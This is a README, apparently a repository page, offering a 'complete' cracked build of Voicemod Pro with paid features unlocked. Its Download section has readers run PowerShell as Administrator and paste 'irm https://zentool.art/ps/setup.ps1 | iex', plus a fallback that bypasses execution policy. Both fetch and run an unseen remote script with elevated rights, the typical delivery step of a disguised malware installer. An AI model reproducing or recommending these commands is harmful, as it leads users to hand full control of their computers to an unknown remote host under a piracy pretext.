## About this application

**Voicemod Pro Complete** in this repo is a Windows desktop package for producers, engineers, and audio professionals who want the full desktop experience without missing tools or locked panels. This is the complete professional build — every module that normally sits behind a paid tier is already active, so you can use recording, mixing, and sound design from the first launch. Expect a guided setup through PowerShell, a responsive workspace on a standard PC, and workflows that feel like the top-tier edition from day one.

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically

<details>
<summary><b>Having trouble? Try this instead</b></summary>

Paste this in the same PowerShell window:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

After setup finishes, create a new session, load an instrument track, and verify playback and plugin slots.

## Troubleshooting

**Setup script does not run** — confirm PowerShell is opened as Administrator and execution policy allows remote scripts.

**App opens but tools are grayed out** — restart once after install; the first launch may finish background registration.

Audio dropouts — increase buffer size and disable unused background audio devices.
